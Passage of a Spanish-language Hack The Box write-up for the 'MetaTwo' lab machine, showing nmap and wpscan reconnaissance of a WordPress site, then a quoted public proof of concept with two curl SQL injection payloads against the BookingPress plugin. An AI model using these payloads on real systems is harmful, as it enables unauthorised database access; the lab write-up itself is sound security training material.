<!DOCTYPE html>
<html>

<head>
    <title>HTB - MetaTwo</title>

    <link rel="stylesheet" href="https://cdn.simplecss.org/simple.min.css">
    <link rel="stylesheet" href="/custom.css">
</head>
<header>
    <nav>
        <a href="/index.html" class="current">Inicio</a>
        <a href="/writeups.html">Writeups</a>
        <a href="/notes.html">Notes</a>
    </nav>
    <h1>HTB - MetaTwo</h1>
</header>

<body>
    <article>
        <h2>Reconocimiento inicial:</h2>
        <p>Como primer paso lanzaremos un nmap para comprobar los puertos de la máquina abiertos.</p>
        <code class="command">nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.11.186</code>
        <details>
            <summary>Output</summary>
            <pre>
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-01 13:33 CET
Initiating Parallel DNS resolution of 1 host. at 13:33
Completed Parallel DNS resolution of 1 host. at 13:33, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 13:33
Scanning 10.10.11.186 [65535 ports]
Discovered open port 21/tcp on 10.10.11.186
Discovered open port 22/tcp on 10.10.11.186
Discovered open port 80/tcp on 10.10.11.186
Completed SYN Stealth Scan at 13:34, 16.68s elapsed (65535 total ports)
Nmap scan report for 10.10.11.186
Host is up, received user-set (0.10s latency).
Scanned at 2023-03-01 13:33:52 CET for 17s
Not shown: 64777 closed ports, 755 filtered ports
Reason: 64777 resets and 755 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.85 seconds
Raw packets sent: 81843 (3.601MB) | Rcvd: 72403 (2.896MB)

        </pre>
        </details>
        <p>Flags:</p>
        <ul>
            <li><b>-p-</b>: Especifica que queremos explorar todos los puertos</li>
            <li><b>--open</b>: Muestra solo los puertos abiertos</li>
            <li><b>-sS</b>: Escaneo SYN de los puertos. Permite escanear de manera mas rapida sin necesidad de
                establecer una conexión.</li>
            <li><b>--min-rate</b>: Define la velocidad de envio de paquetes.</li>
            <li><b>-vvv</b>: Nivel de verbose.</li>
            <li><b>-Pn</b>: Deshabilita la enumeracion de hosts.</li>
            <li><b>10.10.11.186</b>: IP que queremos escanear</li>
        </ul>
        <p>En este primer escaneo vemos que tenemos los puertos 21, 22 y 80 abiertos. Estos corresponen a los servicios
            ftp, ssh y http respectivamente.</p>
        <p>Una vez sabemos que puertos hay abiertos hacemos un escaneo en mas profundidad con el siguiente comando.</p>
        <code class="command">nmap -sCV -p21,22,80 10.10.11.186</code>
        <details>
            <summary>Output</summary>
            <pre>
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-01 13:36 CET
Nmap scan report for 10.10.11.186
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.80%I=7%D=3/1%Time=63FF46E7%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.
SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.39 seconds
        </pre>
        </details>
        <ul>
            <li><b>-sCV</b>: Realizamos el escaneo ejecutando los scripts por defecto y escaneando las versiones de los
                servicios.</li>
            <li><b>-p21,22,80</b>: Especificamos los puertos a escanear.</li>
            <li><b>10.10.11.186</b>: IP que queremos escanear</li>
        </ul>
        <p>Es importante tener en cuenta
            que tenemos que modificar el archivo /etc/hosts y añadir el enlace que nos señala nmap, el cual no ha sido
            redireccionado, de lo contrario los resultados seran incompletos y no podremos acceder a la plataforma web.
        </p>
        <p>El output después de realizar el cambio en el fichero hosts es el siguiente:</p>
        <details>
            <summary>Output</summary>
            <pre>
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-01 13:38 CET
Nmap scan report for metapress.htb (10.10.11.186)
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-generator: WordPress 5.6.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.18.0
|_http-title: MetaPress &#8211; Official company site
|_http-trane-info: Problem with XML parsing of /evox/about
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.80%I=7%D=3/1%Time=63FF4767%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.
SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.01 seconds

        </pre>
        </details>
        <p>Como podemos combrobar obtenemos mas información sobre el servicio web.</p>
        <p>De este segundo escaneo obtener la siguiente información: </p>
        <ul>
            <li>Sabemos que la direccion 10.10.11.186 nos redirecciona a metapress.htb</li>
            <li>El servidor esta corriendo nginx 1.18.0</li>
            <li>El servidor ftp es un ProFTPD Server</li>
            <li>La versión de ssh es OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</li>
            <li>La plataforma web está creada con WordPress 5.6.2</li>
            <li>El panel de administrador esta en la ruta /wp-admin/</li>
        </ul>
        <p>Para complementar la información inicial ejecutamos</p>
        <code class="command">whatweb 10.10.11.186</code>
        <details>
            <summary>Output</summary>
            <pre>
[200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress &#8211; Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]
        </pre>
        </details>
        <p>Esta nos confirma la información anterior y ademas nos indica que WordPress esta utilizando PHP 8.0.24</p>
        <p>Continuamos el reconocimiento ejecutando WPScan para comrpobar si hay alguna culnerabilidad del lado de
            WordPress. </p>
        <code
            class="command">wpscan --url http://metapress.htb/ --plugins-detection mixed -e ap,at --api-token "TOKEN" -t 450</code>
        <details>
            <summary>Output</summary>
            <pre>
[+] URL: http://metapress.htb/ [10.10.11.186]
[+] Started: Wed Mar  1 13:52:51 2023

Interesting Finding(s):

[+] Headers
    | Interesting Entries:
    |  - Server: nginx/1.18.0
    |  - X-Powered-By: PHP/8.0.24
    | Found By: Headers (Passive Detection)
    | Confidence: 100%

[+] robots.txt found: http://metapress.htb/robots.txt
    | Interesting Entries:
    |  - /wp-admin/
    |  - /wp-admin/admin-ajax.php
    | Found By: Robots Txt (Aggressive Detection)
    | Confidence: 100%

[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%
    | References:
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://metapress.htb/readme.html
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 60%
    | References:
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
    |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
    | Found By: Rss Generator (Passive Detection)
    |  - http://metapress.htb/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
    |  - http://metapress.htb/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
    |
    | [!] 29 vulnerabilities identified:
    |
    | [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
    |     Fixed in: 5.6.3
    |     References:
    |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447
    |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
    |      - https://core.trac.wordpress.org/changeset/29378
    |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
    |      - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
    |      - https://hackerone.com/reports/1095645
    |      - https://www.youtube.com/watch?v=3NBxcmqCgt4
    |
    | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
    |     Fixed in: 5.6.3
    |     References:
    |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
    |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
    |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
    |      - https://core.trac.wordpress.org/changeset/50717/
    |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
    |
    | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
    |     Fixed in: 5.6.4
    |     References:
    |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
    |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
    |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
    |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
    |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
    |      - https://www.youtube.com/watch?v=HaW15aMzBUM
    |
    | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
    |     Fixed in: 5.6.5
    |     References:
    |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
    |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
    |      - https://github.com/lodash/lodash/wiki/Changelog
    |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
    |
    | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
    |     Fixed in: 5.6.5
    |     References:
    |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
    |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
    |
    | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
    |     Fixed in: 5.6.5
    |     References:
    |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
    |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
    |
    | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
    |     Fixed in: 5.6.6
    |     References:
    |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
    |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
    |      - https://core.trac.wordpress.org/ticket/54207
    |
    | [!] Title: WordPress < 5.8 - Plugin Confusion
    |     Fixed in: 5.8
    |     References:
    |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
    |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
    |
    | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
    |     Fixed in: 5.6.7
    |     References:
    |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
    |      - https://hackerone.com/reports/1378209
    |
    | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
    |     Fixed in: 5.6.7
    |     References:
    |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
    |      - https://hackerone.com/reports/425342
    |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
    |
    | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
    |     Fixed in: 5.6.7
    |     References:
    |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
    |
    | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
    |     Fixed in: 5.6.7
    |     References:
    |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
    |      - https://hackerone.com/reports/541469
    |
    | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
    |     Fixed in: 5.6.8
    |     References:
    |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
    |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
    |
    | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
    |     Fixed in: 5.6.9
    |     References:
    |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
    |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
    |
    | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
    |     Fixed in: 5.6.9
    |     References:
    |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
    |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
    |
    | [!] Title: WP < 6.0.2 - SQLi via Link API
    |     Fixed in: 5.6.9
    |     References:
    |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
    |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
    |
    | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
    |
    | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
    |
    | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
    |
    | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
    |
    | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
    |
    | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
    |
    | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
    |
    | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
    |
    | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
    |     Fixed in: 5.6.10
    |     References:
    |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
    |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
    |      - https://github.com/WordPress/gutenberg/pull/45045/files
    |
    | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
    |     References:
    |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
    |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

[+] WordPress theme in use: twentytwentyone
    | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
    | Last Updated: 2022-11-02T00:00:00.000Z
    | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
    | [!] The version is out of date, the latest version is 1.7
    | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
    | Style Name: Twenty Twenty-One
    | Style URI: https://wordpress.org/themes/twentytwentyone/
    | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
    | Author: the WordPress team
    | Author URI: https://wordpress.org/
    |
    | Found By: Css Style In Homepage (Passive Detection)
    | Confirmed By: Css Style In 404 Page (Passive Detection)
    |
    | Version: 1.1 (80% confidence)
    | Found By: Style (Passive Detection)
    |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive and Aggressive Methods)
    Checking Known Locations - Time: 00:44:44 <=========================================================================> (102409 / 102409) 100.00% Time: 00:44:44
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] add-dofollow-to-blog-comment-links
    | Location: http://metapress.htb/wp-content/plugins/add-dofollow-to-blog-comment-links/
    |
    | Found By: Known Locations (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/add-dofollow-to-blog-comment-links/, status: 500
    |
    | The version could not be determined.

[+] bookingpress-appointment-booking
    | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
    | Last Updated: 2023-02-18T07:21:00.000Z
    | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
    | [!] The version is out of date, the latest version is 1.0.52
    |
    | Found By: Known Locations (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
    |
    | [!] 2 vulnerabilities identified:
    |
    | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
    |     Fixed in: 1.0.11
    |     References:
    |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
    |      - https://plugins.trac.wordpress.org/changeset/2684789
    |
    | [!] Title: BookingPress < 1.0.31 - Unauthenticated IDOR in appointment_id
    |     Fixed in: 1.0.31
    |     References:
    |      - https://wpscan.com/vulnerability/8a7bd9f6-2789-474b-a237-01c643fdfba7
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4340
    |
    | Version: 1.0.10 (100% confidence)
    | Found By: Readme - Stable Tag (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
    | Confirmed By: Translation File (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'

[+] feed
    | Location: http://metapress.htb/wp-content/plugins/feed/
    |
    | Found By: Known Locations (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/feed/, status: 200
    |
    | The version could not be determined.

[+] leira-roles
    | Location: http://metapress.htb/wp-content/plugins/leira-roles/
    | Latest Version: 1.1.8.0 (up to date)
    | Last Updated: 2022-05-05T05:13:00.000Z
    | Readme: http://metapress.htb/wp-content/plugins/leira-roles/README.txt
    |
    | Found By: Known Locations (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/leira-roles/, status: 200
    |
    | Version: 1.1.8.0 (100% confidence)
    | Found By: Readme - Stable Tag (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt
    | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
    |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
    Checking Known Locations - Time: 00:10:30 <===========================================================================> (25330 / 25330) 100.00% Time: 00:10:30
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyone
    | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
    | Last Updated: 2022-11-02T00:00:00.000Z
    | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt
    | [!] The version is out of date, the latest version is 1.7
    | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css
    | Style Name: Twenty Twenty-One
    | Style URI: https://wordpress.org/themes/twentytwentyone/
    | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
    | Author: the WordPress team
    | Author URI: https://wordpress.org/
    |
    | Found By: Urls In Homepage (Passive Detection)
    | Confirmed By:
    |  Urls In 404 Page (Passive Detection)
    |  Known Locations (Aggressive Detection)
    |   - http://metapress.htb/wp-content/themes/twentytwentyone/, status: 500
    |
    | Version: 1.1 (80% confidence)
    | Found By: Style (Aggressive Detection)
    |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.1'

[+] WPScan DB API OK
    | Plan: free
    | Requests Done (during the scan): 7
    | Requests Remaining: 68

[+] Finished: Wed Mar  1 14:48:49 2023
[+] Requests Done: 127906
[+] Cached Requests: 22
[+] Data Sent: 38.938 MB
[+] Data Received: 66.343 MB
[+] Memory used: 470.988 MB
[+] Elapsed time: 00:55:57
        </pre>
        </details>
        <ul>
            <li>--url: </li>
            <li>--plugins-detection: </li>
            <li>-e:</li>
            <li>--api-token: </li>
            <li>-t:</li>
        </ul>
        <p>En lo que ha vulnerabilidades de wordrpess respecta hay bastantes. Ignoraremos todas las que
            requieren estar autenticado y las de XSS entre otras que no nos interesan. Nos quedaría la siguiente lista:
        </p>
        <ol>
            <li>WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer</li>
            <li>WordPress 5.4 to 5.8 - Lodash Library Update</li>
            <li>WordPress &lt; 5.8.3 - SQL Injection via WP_Query</li>
            <li>Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query</li>
            <li>WordPress &lt; 5.9.2 - Prototype Pollution in jQuery</li>
            <li>WP &lt; 6.0.2 - SQLi via Link API</li>
            <li>WP &lt; 6.0.3 - SQLi in WP_Date_Query</li>
        </ol>
        <p>También tenemos dos vulnerabilidades en el plugin bookingpress-appointment-booking:</p>
        <ol>
            <li>BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection</li>
            <li>BookingPress &lt; 1.0.31 - Unauthenticated IDOR in appointment_id</li>
        </ol>
        <h2>Explotación:</h2>
        <p>Como primer enfoque explotaremos la vulnerabilidad del plugin para ver si conseguimos credenciales para la
            plataforma web. Además tenemos a nuestra disposición un <a
                href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">PoC</a>.</p>
        <blockquote>
            <p>- Create a new "category" and associate it with a new "service" via the BookingPress admin menu
                (/wp-admin/admin.php?page=bookingpress_services)</p>
            <p>- Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step
                Wizard Form")</p>
            <p>- Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search
                for "action:'bookingpress_front_get_category_services'")</p>
            <p>- Invoke the following curl command:</p>
            <p>curl -i 'https://example.com/wp-admin/admin-ajax.php' --data
                'action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=33&amp;total_service=-7502)
                UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'</p>
            <p>Time based payload: curl -i 'https://example.com/wp-admin/admin-ajax.php' --data
                'action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=1&amp;total_service=1)
                AND
                (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH' </p>
        </blockquote>
        <p>Después de ejecutar el comando:</p>
